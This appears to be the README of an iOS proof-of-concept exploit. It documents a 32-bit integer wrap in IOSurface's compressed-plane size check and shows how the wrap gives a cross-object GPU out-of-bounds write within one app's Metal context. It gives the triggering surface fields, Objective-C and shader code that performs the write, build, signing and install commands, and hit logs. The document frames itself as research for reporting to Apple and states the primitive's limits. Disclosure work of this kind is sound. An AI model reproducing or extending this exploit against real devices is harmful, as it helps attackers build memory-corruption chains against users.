# F1OOB-PoC — IOSurface F1 wrap → GPU cross-object OOB write

> Status: **PoC harness + confirmed primitive on iOS 27.2 / 24B115 (iPhone14,7, T8110)**.
> This is **not kernel R/W** and not root. The primitive lives inside the app's GPU context.

---

## 1. The bug

In `IOSurface.kext` (27.2, 24B115), the compressed-plane parser computes the total
multi-slice compressed-plane size in 32-bit arithmetic:

```c
// FUN_fffffff009c1af14, lines 1353-1363 (decompiled)
if (planeSize <
    (uint)((dataRegionBytesPerSlice + headerRegionBytesPerSlice) * sliceCount)) {
    reject;
}
```

Both addends and the product are `uint`/`int`, so the check is performed modulo 2^32.
The following shape:

```
IOSurfacePlaneSize                       = 0x10000
IOSurfaceAllocSize                       = 0x10000
IOSurfaceSliceCount                      = 4
IOSurfacePlaneDataRegionBytesPerSlice    = 0x4000
IOSurfacePlaneHeaderRegionBytesPerSlice  = 0x40000000
```

produces:

```
data + header        = 0x40004000
(data + header) * 4  = 0x1_0001_0000   // true size: 4 GiB + 64 KiB
32-bit truncation    = 0x00010000      // 64 KiB
planeSize (0x10000) < 0x10000 == false // check passes
```

The kernel accepts a surface whose declared logical region is **4 GiB + 64 KiB**
while the real allocation is **64 KiB**. The GPU path (`AGX`/`IOGPU`) consumes that
size, which creates a mismatch between the GPU VA range and the real allocation.

---

## 2. What happens on the GPU side

1. The surface is created through `IOSurfaceRoot` selector 0 (in-band XML).
2. The app opens `AGXAcceleratorG14P` type 1 and calls selector 8 with type `0x82`
   and the surface ID.
3. AGX creates a GPU resource. The output contains:

```
out+0x00 = resource GPU VA       (e.g. 0x1500000000)
out+0x28 = declared span         (0x1000000 / 16 MiB in a favorable state,
                                  0x10000 / 64 KiB in a fresh state)
```

4. The app wraps the 64 KiB IOSurface in a 64 KiB `MTLBuffer` via
   `newBufferWithBytesNoCopy:length:0x10000`. The buffer's `gpuAddress` matches
   `out+0x00`.
5. The GPU page table is **per-context**. Subsequent `MTLBuffer`s receive GPU VAs
   close to the F1 buffer. A shader's `device uint *buf` is a raw GPU VA; Metal does
   not insert a bounds check on every access.
6. If you compute `victim.gpuAddress - f1.gpuAddress` and write through the F1 buffer
   at that index, the write lands in the **other Metal buffer** when its PTE is mapped
   in the same context.

That is the cross-object GPU OOB write: not “16 MiB of physical memory”, but a
**GPU VA collision** inside one process/context.

---

## 3. PoC code

File: `main.m`.

Key steps:

```objc
// 1. F1 surface via IOSurfaceRoot sel0
uint32_t sid = create_surface(conn, f1_xml(), "F1");

// 2. AGX resource
uint64_t agx_va = agx_map(sid, &agx_span, &agx_conn);

// 3. 64 KiB Metal wrapper around the 64 KiB IOSurface
id<MTLBuffer> f1buf = [dev newBufferWithBytesNoCopy:base
                                             length:0x10000
                                            options:MTLResourceStorageModeShared
                                        deallocator:nil];
uint64_t f1ga = gpu_address(f1buf);

// 4. Victim Metal buffer allocated after F1
id<MTLBuffer> victim = [dev newBufferWithLength:0x10000
                                        options:MTLResourceStorageModeShared];
uint64_t victimga = gpu_address(victim);

// 5. Write through the F1 buffer at the victim's GPU address
uint32_t idx = (uint32_t)((victimga - f1ga) / 4);
uint32_t marker = 0x43434343;

// kernel void wr(device uint *buf [[buffer(0)]],
//                constant uint &idx [[buffer(1)]],
//                constant uint &val [[buffer(2)]]) { buf[idx] = val; }
// dispatch with f1buf, idx, marker

// 6. Check the victim's CPU contents
uint32_t back;
memcpy(&back, victim.contents, 4);
if (back == marker) {
    // cross-object GPU OOB write confirmed
}
```

The PoC also performs a reference test at a fixed `+0x20000` offset and logs whether
that page is backed in the current run. Fixed offsets are **not portable**; targets
must be selected by runtime `gpuAddress`.

---

## 4. Build, sign, run

Theos does not support spaces in the project path, so build from a path without
spaces:

```bash
cd /home/femboychik/asuka4scape/02_KERNEL/f1_poc
make clean && make ipa
```

Sign:

```bash
zsign -k cert.p12 -p <pass> -m profile.mobileprovision \
      -o F1OOB-PoC-signed.ipa F1OOB-PoC.ipa
```

Install and run:

```bash
pymobiledevice3 apps install F1OOB-PoC-signed.ipa
pymobiledevice3 developer core-device launch-application --kill-existing \
  app.lake9674.aquila8809
```

Logs on device:

```
Documents/F1OOB-PoC/latest.log
Documents/F1OOB-PoC/run-YYYYMMDD-HHMMSS.log
```

---

## 5. Observed logs

### 5.1. Confirmed cross-object hit (F1Probe, 27.2 / 24B115)

```
[METAL] gpuAddress=0x1500000000
[CTRLBUF] gpuAddress=0x1500100000
[XOBJ] f1ga=0x1500000000 ctrlga=0x1500100000 delta=0x100000 xidx=0x40000
[XOBJ] F1 write ctrl-va marker=0x43434343 status=4
[XOBJ] *** CROSS-OBJECT HIT ctrl off=0x0 ***
```

A write through the F1 buffer at `+0x100000` changes the contents of a separate
`MTLBuffer`.

### 5.2. Fresh PoC runs (current device state)

With 15 filler buffers the victim lands at `+0x180000`:

```
[AGX] sel8=0x0 gpuVA=0x1500000000 span=0x10000
[METAL] F1 MTLBuffer=... gpuAddress=0x1500000000
[METAL] victim MTLBuffer=... gpuAddress=0x1500180000
[METAL] delta=0x180000 span=0x10000 inSpan=no
[METAL] VICTIM[0]=0x42424242
[METAL] no cross-object hit
```

With 6 filler buffers the victim lands at `+0xA8000`, still no hit:

```
[METAL] victim MTLBuffer=... gpuAddress=0x15000a8000
[METAL] delta=0xa8000 span=0x10000 inSpan=no
[METAL] VICTIM[0]=0x42424242
[METAL] no cross-object hit
```

This is an important negative result: **the 16 MiB span/VA reservation is not
deterministic**. In a favorable state (older F1Probe runs) the AGX/VA allocator
reserves a large range and the cross-object hit works at `+0x100000`. In a fresh
state the same XML yields 64 KiB and the victim is out of reach.

The cause is state-dependent AGX resource/VA allocator behavior on this build
(first mapping, cache/reservation), not a difference in the XML. The XML in the PoC
and in F1Probe is **byte-for-byte identical** (1750 bytes + NUL, sum `0x854b747c`).
The PoC is therefore a harness: it logs all addresses/span and attempts the
cross-object write, but the hit depends on the AGX VA reservation state.

---

## 6. Primitive boundaries

- **Same process / same GPU context.** Other processes, the kernel, and SPTM are not
  mapped into this GPU VA.
- **Not kernel R/W.** The write goes through the GPU page table into GPU pages, not
  into CPU page tables.
- **No page table/TTBAT in the window.** A full 16 MiB scan found only Metal shaders
  and reciprocal tables; no page table/TTBAT.
- **Fixed offsets are unstable.** Only runtime `gpuAddress` targeting works.
- **Span/VA reservation is unstable.** The PoC is a harness; a stable hit needs
  grooming/state in which AGX reserves a large range.

---

## 7. Value for Apple

This is a memory-safety bug in the chain:

```
sandboxed app
  -> IOSurface compressed-plane 32-bit wrap (F1)
  -> kernel accepts 4 GiB + 64 KiB logical region for a 64 KiB allocation
  -> AGX/Metal resource VA mismatch
  -> cross-object GPU OOB write inside the app's GPU context
```

A report should include:

1. The F1 XML and exact fields.
2. The `sel0` log (parser accepted) and AGX `out+0x00/out+0x28`.
3. The cross-object hit log by `gpuAddress` (F1Probe).
4. A clear statement that the primitive is same-context, not kernel R/W.

---

## 8. Files

```
main.m              — PoC
Makefile            — Theos build
Info.plist          — bundle app.lake9674.aquila8809
entitlements.plist  — empty
README.md           — this file
evidence/           — F1Probe cross-object hit log
```
